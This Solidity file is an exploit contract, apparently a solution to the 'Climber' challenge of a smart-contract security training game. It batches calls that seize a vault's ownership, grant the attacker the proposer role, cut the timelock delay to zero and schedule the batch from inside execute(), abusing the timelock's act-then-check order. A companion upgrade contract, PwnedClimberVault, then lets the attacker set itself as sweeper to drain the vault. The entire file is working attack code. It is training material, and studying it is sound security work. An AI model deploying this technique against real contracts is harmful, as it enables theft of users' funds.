// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../climber/ClimberTimelock.sol";
import "../climber/ClimberVault.sol";

contract ClimberExploit {
    address payable private timelock;
    address private vault;
    address private attacker;

    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;

    constructor(address payable timelockAddress, address vaultAddress) {
        timelock = timelockAddress;
        vault = vaultAddress;
        attacker = msg.sender;

        // take ownership of the vault to be able to upgrade it
        targets.push(vault);
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("transferOwnership(address)", attacker)
        );

        // take PROPOSER_ROLE of the timelock to be able to call timelock.schedule()
        bytes32 PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
        targets.push(timelock);
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                PROPOSER_ROLE,
                address(this)
            )
        );

        // down timelock delay to 0 to be able to create a ReadyForExecution operation in the same transaction
        targets.push(timelock);
        values.push(0);
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", 0));

        // timelock.schedule() the attack to get an operation id and pass timelock.execute() checks
        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("scheduleProxy()"));
    }

    function attack() external {
        require(msg.sender == attacker);

        // timelock.execute() isn't complaint with checks-effects-interactions pattern
        ClimberTimelock(timelock).execute(targets, values, dataElements, 0);
    }

    function scheduleProxy() external {
        require(msg.sender == timelock);

        ClimberTimelock(timelock).schedule(targets, values, dataElements, 0);
    }
}

contract PwnedClimberVault is ClimberVault {
    function pwn() external onlyOwner {
        _setSweeper(msg.sender);
    }
}
